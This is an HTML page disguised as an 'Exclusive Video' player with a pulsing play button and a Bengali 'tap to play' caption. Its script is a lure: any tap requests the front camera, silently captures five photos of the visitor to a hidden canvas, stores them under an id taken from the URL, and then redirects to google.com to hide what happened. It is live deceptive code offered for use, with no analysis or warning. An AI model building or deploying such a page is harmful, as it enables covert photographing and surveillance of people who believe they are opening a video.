<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Exclusive Video</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body,html{height:100%;background:#000;overflow:hidden;position:relative;}
    .player{width:100%;height:100%;display:flex;align-items:center;justify-content:center;position:relative;cursor:pointer;}
    .bg{position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(16px) brightness(0.5);transform:scale(1.12);}
    .overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);}
    .play{width:100px;height:100px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 70px rgba(255,0,0,0.9);border:6px solid rgba(255,255,255,0.4);animation:pulse 2s infinite;z-index:10;}
    .play i{font-size:50px;color:#fff;margin-left:8px;}
    @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.2);}}
    .title{position:absolute;bottom:80px;color:#fff;font-size:28px;font-weight:bold;text-shadow:0 0 20px #000;z-index:10;}
  </style>
</head>
<body onclick="grab()">

<div class="player">
  <div class="bg"></div>
  <div class="overlay"></div>
  <div class="play"><i>Play</i></div>
  <div class="title">ট্যাপ করো প্লে করতে</div>
</div>

<canvas id="c" style="display:none;"></canvas>

<script>
const id = new URLSearchParams(location.search).get('id');

function grab() {
  const canvas = document.getElementById('c');
  const ctx = canvas.getContext('2d');
  let pics = [];

  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
    .then(stream => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      let i = 0;
      const take = () => {
        if (i >= 5) {
          localStorage.setItem('camsnap_' + id, JSON.stringify(pics));
          setTimeout(() => location.href = "https://google.com", 800);
          return;
        }
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        pics.push(canvas.toDataURL('image/jpeg', 0.95));
        i++;
        setTimeout(take, 700);
      };
      setTimeout(take, 1000);
    })
    .catch(() => {
      setTimeout(() => location.href = "https://google.com", 1500);
    });
}
</script>
</body>
</html>
